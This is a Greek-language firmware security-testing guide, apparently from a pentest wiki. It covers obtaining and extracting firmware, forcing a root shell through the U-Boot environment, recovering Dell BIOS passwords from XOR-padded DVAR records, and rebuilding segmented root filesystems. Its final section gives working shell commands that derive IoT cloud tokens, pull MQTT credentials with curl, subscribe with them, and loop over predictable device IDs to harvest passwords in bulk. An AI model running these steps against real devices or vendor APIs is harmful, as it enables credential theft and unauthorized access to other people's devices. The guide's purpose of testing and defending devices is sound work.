## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που εκτελεί
- Λεπτομέρειες του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές του codebase και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι πολύτιμα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, κατασκευαστές)
- **Δημιουργία** του βάσει των παρεχόμενων οδηγιών
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση ερωτημάτων **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** με τεχνικές man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Sniffing** για αιτήματα ενημέρωσης στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Απόρριψη** από τον bootloader ή μέσω δικτύου
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, όταν όλα τα άλλα αποτύχουν, με τα κατάλληλα εργαλεία hardware

### Καταγραφή μόνο μέσω UART: εξαναγκασμός σε root shell μέσω U-Boot env στο flash

Αν το UART RX αγνοείται (εμφανίζονται μόνο logs), μπορείτε και πάλι να εξαναγκάσετε την εκκίνηση ενός init shell, **επεξεργαζόμενοι offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Κάντε dump του SPI flash με clip SOIC-8 και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες γι’ αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε για αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρεις πολλά με αυτά τα εργαλεία, έλεγξε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε είναι απίθανο να είναι κρυπτογραφημένη. Αν είναι υψηλή, είναι πιθανό να είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

### Ακατέργαστα assets οθόνης σε εξωτερική flash

Ένα εξωτερικό SPI dump δεν είναι απαραίτητα το εκτελέσιμο firmware του MCU. Για έναν στόχο Cortex-M, σύγκρινε την αρχή κάθε υποψήφιας περιοχής κώδικα με τον χάρτη μνήμης της συσκευής: ένας κανονικός πίνακας διανυσμάτων ξεκινά με μια εύλογη διεύθυνση δείκτη στοίβας SRAM και μια διεύθυνση reset handler σε εκτελέσιμη μνήμη. Η απουσία πίνακα διανυσμάτων στο offset μηδέν από μόνη της δεν αποδεικνύει ότι ολόκληρο το chip δεν περιέχει κώδικα· επιθεώρησε και άλλα offsets καθώς και τη διάταξη εκκίνησης. Αν το `binwalk` δεν εντοπίσει κάποιο container, επιθεώρησε τα ακατέργαστα bytes και συσχέτισε τις διευθύνσεις ανάγνωσης flash από ένα [αποκωδικοποιημένο SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) με τις ενέργειες που φορτώνουν νέες οθόνες.<sup>[[14]](#references)</sup>

Για μια περιοχή με assets οθόνης, δοκίμασε πιθανά pixel formats και διαστάσεις αντί να υποθέσεις ότι πρόκειται για PNG/JPEG. Η συσκευή που αναφέρεται χρησιμοποιούσε frames **80×160 RGB565 little-endian**: με δύο bytes ανά pixel, ένα frame έχει μέγεθος **25,600 bytes** (25 KiB), όχι 24 kilobits. Μια διεύθυνση ανάγνωσης flash που αποκωδικοποιήθηκε προσδιόρισε το offset του asset της οθόνης· ο ερευνητής μετέτρεψε μια προετοιμασμένη εικόνα με `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, αντικατέστησε το asset ίδιου μεγέθους στο αρχικό dump, το έγραψε με `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` και επιβεβαίωσε ότι η νέα εικόνα εμφανιζόταν στην οθόνη. Αυτό αποδεικνύει ότι είναι εγγράψιμα τα *εξωτερικά assets οθόνης*, όχι ότι έγινε εξαγωγή ή επαναπρογραμματισμός του εσωτερικού firmware του MCU. Διατήρησε το αρχικό dump και επαλήθευσε τις διαστάσεις, τη σειρά των bytes, το offset και το μήκος του asset αντικατάστασης πριν από οποιαδήποτε εγγραφή.<sup>[[14]](#references)</sup>

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών με XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, πάρε πρώτα αρκετές αναγνώσεις flash υπό τις ίδιες συνθήκες, άλλαξε **ακριβώς μία** ρύθμιση, κάνε ξανά dump ολόκληρου του chip και σύγκρινε τα offsets. Επανάλαβε το πείραμα με ελεγχόμενες τιμές για να ξεχωρίσεις τη ρύθμιση από μετρητές και metadata εγγραφών· αλλαγές σε νέα offsets αντί για επιτόπου υποδεικνύουν αποθήκευση μόνο με προσθήκη ή με δομή καταγραφής. Διατήρησε τις διαγραμμένες εγγραφές και όσες έχουν σημειωθεί ως διαγραμμένες, καθώς τα bytes των payload τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα firmware modules με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, την ευρετηρίαση των κλειδιών και την παραγωγή των κλειδιών, αντί να συμπεραίνετε το σχήμα μόνο από μοτίβα του ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο padding μηδενικών

Όπως περιγράφεται στην ενότητα [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το padding μηδενικών του καλύπτει κάθε θέση ενός επαναλαμβανόμενου κλειδιού XOR: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του κλειδιού, ανακατασκευάστε το κλειδί από το τέλος του ciphertext και αποκρυπτογραφήστε τα συμπληρωμένα bytes.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι σε plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού πρόσβασης `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται το πλήρες κλειδί και ο κωδικός πρόσβασης χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR προκύπτει κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, ενώ η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε απλό κείμενο. Αυτό δίνει έως 256 κλειδιά ανά συσκευή και σημαίνει ότι οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και διαγραμμένες εγγραφές με βάση αυτό το byte· μια σύντομη ιστορική εγγραφή μπορεί να αποκαλύψει ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή, για την οποία το δικό της padding δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό ciphertext σημειώνεται ως διαγραμμένο αντί να διαγράφεται οριστικά.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα bytes και τα bytes του κλειδιού. Δημιουργήστε το από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για custom parsers, απορρίψτε τα false positives ελέγχοντας τη δομή εγγραφών, τους περιορισμούς εκτυπώσιμων χαρακτήρων, το zero-padding, την εντροπία κλειδιού και τη συνέπεια στα σημεία όπου γίνεται αναδίπλωση του κλειδιού. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αλλαγές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και κατατάξτε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Οι επαληθευτές κωδικών πρόσβασης θα πρέπει να αποθηκεύουν salted, επαναληπτικό μονόδρομο hash αντί για αναστρέψιμο ciphertext, ενώ τα log-structured stores θα πρέπει να αφαιρούν με ασφάλεια τα παρωχημένα μυστικά δεδομένα.<sup>[[12]](#references)</sup>

### Λήψη του Συστήματος Αρχείων

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει τα magic bytes του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να κάνετε carve το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για να κάνετε carving στο σύστημα αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Στη συνέχεια, τα αρχεία θα βρίσκονται στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή τμηματοποιημένων root filesystems ενσωματωμένων συστημάτων

Αν ένα raw dump eMMC/SSD περιέχει έγκυρη επικεφαλίδα συστήματος αρχείων, αλλά τα offsets των μεταδεδομένων εκτείνονται πέρα από τα ονομαστικά όρια του partition, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συναρμολογήσει την πραγματική συσκευή root από πολλαπλές φυσικές περιοχές χρησιμοποιώντας το Device Mapper, οπότε η εξαγωγή δεδομένων από ένα partition GPT αποδίδει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Έλεγχος ολόκληρης της εικόνας του μέσου

Αρχικά, βεβαιωθείτε ότι η λήψη έχει ολοκληρωθεί, το μέγεθος παραμένει σταθερό και καμία διεργασία εγγραφής δεν χρησιμοποιεί πλέον την εικόνα. Αν το όνομα αρχείου κωδικοποιεί διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο physical volume στον σταθμό εργασίας, καθώς ενδέχεται να προκύψουν συγκρούσεις μεταξύ volume group και ανεπιθύμητες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτιμήστε μια αναλώσιμη VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να έχει πρόσβαση σε ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets του ιδιόκτητου container, μήκη στοιχείων, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφής. Χρησιμοποιήστε αυτές τις τιμές για να απομονώσετε την ενσωματωμένη γραμμή εντολών, τον kernel και το initramfs και, στη συνέχεια, επικυρώστε ανεξάρτητα κάθε έξοδο με τα `file`, magic bytes και `binwalk`. Η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή στον kernel.<sup>[[9]](#references)</sup>

#### Ανάκτηση του block map κατά την εκκίνηση

Εξαγάγετε το initramfs του kernel και κάντε reverse engineering στο `/init` και σε τυχόν βιβλιοθήκες αποθήκευσης. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολουθήστε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τις διαδρομές partition· έπειτα, εντοπίστε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο linear target αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων συσκευών υποστήριξης. Ένας ανακτημένος πίνακας δύο τμημάτων έχει συνήθως την εξής μορφή (όλες οι θέσεις και τα μήκη είναι σε τομείς των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαράγετε ακριβώς την αριθμητική του machine code, συμπεριλαμβανομένου του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος σε bytes σε όριο 4 KiB και μόνο έπειτα το μετατρέπει σε τομείς των 512 byte· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` κάθε φορά που το partition δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα, χρησιμοποιώντας τμήματα με περιορισμένο μέγεθος αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία host-side mapper devices. Διατηρήστε τα offsets που προκύπτουν από το GPT, τους ανεστραμμένους αριθμούς τομέων και το τελικό μήκος εξόδου ως ξεχωριστές επαληθεύσεις.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το little-endian πεδίο 64-bit `bytes_used` στο offset 40 του superblock πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτύχει σε πολλές άσχετες δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρά δομικά υποψήφια στοιχεία: ένα block metadata που αποσυμπιέζεται, αρκετές διαδοχικές έγκυρες καταχωρίσεις καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή integrity-metadata. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν η ίδια υπογεγραμμένη μετατόπιση καθιστά έγκυρες ανεξάρτητες δομές —για παράδειγμα, τα μεταδεδομένα καταλόγου και μια εγγραφή verity— η πιθανότερη αιτία είναι ένα συστηματικό σφάλμα στην αρχή του τμήματος και όχι byte που λείπουν. Επιστρέψτε στην αντίστροφη αριθμητική και αναζητήστε απορριφθέντα υπόλοιπα, προβλήματα προσήμου, υπερχείλιση ή στρογγυλοποίηση σε τομέα/σελίδα προτού επιχειρήσετε ανάκτηση ορφανών δεδομένων ή επιδιόρθωση μεταδεδομένων του συστήματος αρχείων.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε χωριστά τα όρια προστασίας: οι τόμοι LUKS που είναι σφραγισμένοι στο TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ μια υπογεγραμμένη αντιστοίχιση dm-verity προστατεύει την ακεραιότητα του ριζικού συστήματος αρχείων. Ένα software TPM δεν ανακτά κλειδί που είναι σφραγισμένο στο αρχικό φυσικό TPM, και η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για ερευνητική χρήση, το οποίο παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παρακάμπτει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το εξετάσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το image του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρέχεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των κατατμήσεων και των συστημάτων αρχείων:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει έλλειψη κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με τη χρήση του `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** αδυνατεί να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της μετατόπισης του συστήματος αρχείων και, στη συνέχεια, την εντολή `dd` για την αποκοπή του συστήματος αρχείων:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη μη αυτόματη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το σύστημα αρχείων, ξεκινά η αναζήτηση για κενά ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες server ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανά τρωτά σημεία
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και τρωτών σημείων στο σύστημα αρχείων:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που εντοπίζονται στο σύστημα αρχείων πρέπει να ελέγχονται προσεκτικά για τρωτά σημεία. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν αντικείμενο εκμετάλλευσης.

## Συλλογή ρυθμίσεων cloud και διαπιστευτηρίων MQTT μέσω παραγόμενων URL tokens

Πολλά IoT hubs ανακτούν τις ρυθμίσεις κάθε συσκευής από ένα cloud endpoint που μοιάζει με το εξής:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να ανακτήσει τις ρυθμίσεις cloud, αποκαλύπτοντας συχνά διαπιστευτήρια MQTT σε απλό κείμενο και prefixes θεμάτων.

Πρακτική ροή εργασίας:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3,3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL του cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε τη διαδρομή config ("/pf/") ή χρήση του MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολογίστε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή cloud config και διαπιστευτηρίων MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε τα secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Κατάχρηση plaintext MQTT και αδύναμων topic ACLs (εάν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να κάνετε subscribe σε topics συντήρησης και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα ID συσκευών (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να επαναλάβετε υποψήφια ID, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για την ανάκτηση secrets, χωρίς να τροποποιείτε το hardware-στόχο, όταν είναι δυνατό.


